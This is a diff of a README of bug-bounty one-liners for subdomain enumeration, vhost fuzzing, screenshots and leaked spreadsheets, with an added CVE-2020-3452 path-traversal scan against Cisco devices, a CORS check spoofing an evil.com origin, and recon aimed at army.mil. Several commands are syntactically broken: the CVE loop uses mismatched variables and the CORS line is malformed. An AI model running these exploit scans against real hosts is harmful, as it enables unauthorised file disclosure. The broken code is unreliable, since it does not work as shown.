@@ -1,7 +1,7 @@
 # For loops and one liners for bug bounty 
 Credits goes to all those awesome researchers who uploaded these on Twitter and their GitHub  
 
-
+Please Note: Kindly use this only for reference and learning purposes using this doesn't means that you will find Vulnerabilities cause everybody is using this so try to be creative while using this and modify them to get unique results :)
 
 ## One Liners for XSS
 
@@ -52,7 +52,11 @@ gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https:
 ```bash
 curl -s https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/hackerone_data.json | jq -r '.[].targets.in_scope[] | select(.asset_type|contains("URL")) | .asset_identifier' |grep -v "*" | sort
 ```
+### Finding Subdomains from crt.sh @vict0ni
 
+```bash
+curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
+```
 
 ### From Bounty Targets Data @dwisiswant0
 
@@ -95,14 +99,12 @@ Install nuclei, subfinder, Notify and anew
 for url in ` cat $filename `; do ffuf -c -w path.txt -u $url/FUZZ -o result.json ; done >> result.txt
 ```
 
+### For finding Hidden Servers and Admin Panles @rez0
 
+```bash
+ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt 
 
-
-
-If you are getting error jq not found then 
-sudo apt-get install jq
-
-(wildcard domains excluded)
+```
 
 ### Find Subdomains using Subfinder and opens them on Firefox @payloadartists
 
@@ -110,12 +112,24 @@ sudo apt-get install jq
 subfinder -d $1 -silent -t 100 | httprobe -c 50 | sort -u | while read line; do firefox $line; sleep 10; done
 
 ```
+
+## One Liners for Recon and Visual inspection
+
+### Using Assetfinder with gowitness
+assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 
+
+
+
+
+## One Liners for information disclosure
+
 ### Using WaybackURL to find Excel File leads to PII Disclosure @M0_SADAT
 
 ```bash
 gau http://hacked-site.com | waybackurls | grep ".xlsx"
 ```
 
+## One Liners for CVE and Vulnerabilties
 
 ### To find CVE 2020-3452 
 
@@ -123,14 +137,7 @@ gau http://hacked-site.com | waybackurls | grep ".xlsx"
 while read domains.txt; do curl -s -k "https://$domains/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
 ```
 
-
-
-
-
-
-
 ### CORS Missconfiguration @
-
 
 ```bash
 site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
